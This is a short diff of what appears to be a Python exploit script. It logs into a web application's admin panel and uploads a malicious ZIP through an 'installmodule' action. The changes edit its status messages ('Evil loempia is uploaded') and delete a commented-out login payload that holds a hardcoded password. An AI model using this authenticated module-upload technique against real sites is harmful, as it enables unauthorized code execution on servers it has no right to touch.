@@ -28,7 +28,6 @@ from requests_toolbelt.multipart.encoder import MultipartEncoder
 login_url = f"{exp_url}/login.php"
 upload_url = f"{exp_url}/admin.php?action=installmodule"
 headers = {"Referer": login_url,}
-#login_payload = {"cont1": "iloveyou1","junior": "","submit": "Log in"}
 login_payload = {
     args.username: "",
     "cont1": args.password,
@@ -49,7 +48,7 @@ login_response = session.post(login_url, headers=headers, data=login_payload)
 
 
 if login_response.status_code == 200:
-    print("Evil Loempia Login account")
+    print("An evil Loempia Login account")
 
 
     upload_headers = {
@@ -60,7 +59,7 @@ if login_response.status_code == 200:
 
 
     if upload_response.status_code == 200:
-        print("Evil exploit is daar.")
+        print("Evil loempia is uploaded succesfull.")
     else:
         print("ZIP file download error. Response code:", upload_response.status_code)
 else:
